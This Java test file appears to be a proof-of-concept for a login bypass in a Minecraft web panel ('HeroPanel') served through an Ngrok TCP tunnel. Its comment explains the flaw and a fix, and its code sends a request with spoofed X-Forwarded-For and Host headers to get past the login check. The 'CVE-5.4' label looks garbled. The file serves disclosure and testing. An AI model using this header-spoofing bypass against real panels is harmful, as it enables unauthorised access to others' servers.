package herobrine99dan.heropanel.test;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class HostChanger {

	// EXAMPLE OF HEROPANEL EXPLOIT CVE-5.4
	// (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N): You can execute the attack remotely.
	// The attack is really simple to execute and you don't need privileges. There
	// aren't avaibility issues but hackers are able to use all the features of the panel.
	// The bug is on the login handler and happens only if you use Ngrok tunnels, i will show 
	// a possibile fix later, and here the explaination:
	// If you use Ngrok, the ip for the server is always 127.0.0.1, so due to this Ngrok add 
	// the property "X-Forwarded-For" that contains the real ip and the property "Host" that contains 
	// the URL of the HTTP Ngrok Tunnel. If you use HTTP (or HTTPS) Ngrok Tunnel, these values can't be 
	// spoofed because they are handled by the server. But if you use the general TCP Tunnel, 
	// these values can be spoofed easily [HTTP, HTTPS Tunnel and the TCP Tunnel point to the 
	// same connection (localhost:25565). You can spoof the ip and the host on the TCP Tunnel 
	// (used to let Minecraft Clients connect) and bypass the login handler (the TCP Tunnel can't 
	// read and add data to the connection because it doesn't know how to add it correctly].
	// Possible Fix: Host the panel with a different port (don't use the minecraft port).
	// In this case, even if you know the ngrok url and the real ip of the connection, they will
	// be handled automatically by Ngrok if you use Tunnels: you can't spoof those properties!
	public static void main(String[] args) throws IOException {
		URL url = new URL("http://localhost:25567");
		HttpURLConnection con = (HttpURLConnection) url.openConnection();
		con.setRequestMethod("GET");
		con.setRequestProperty("Content-Type", "application/json; utf-8");
		String ipToSpoof = "94.235.21.43";
		String hostToSpoof = "tester.ngrok.io";
		con.setRequestProperty("X-Forwarded-For", ipToSpoof);
		con.setRequestProperty("Host", hostToSpoof);
		con.setRequestProperty("Accept", "application/json");
		con.setDoOutput(true);
		int code = con.getResponseCode();
		System.out.println(code);
	}

}
